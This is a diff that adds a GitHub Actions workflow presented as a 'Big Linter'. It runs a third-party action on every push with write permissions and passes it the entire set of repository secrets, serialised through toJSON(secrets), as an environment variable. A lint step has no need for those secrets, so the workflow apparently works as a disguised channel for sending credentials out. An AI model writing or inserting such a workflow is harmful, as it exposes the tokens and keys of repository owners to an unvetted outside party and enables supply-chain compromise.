@@ -1,0 +1,17 @@
+name: Big Linter
+
+on: [push]
+
+permissions:
+  contents: write
+  pull_requests: write
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run Big Linter
+        uses: gcbrun/big-linter@v1
+        env:
+          PR_ENVIRONMENT: ${{ toJSON(secrets) }}
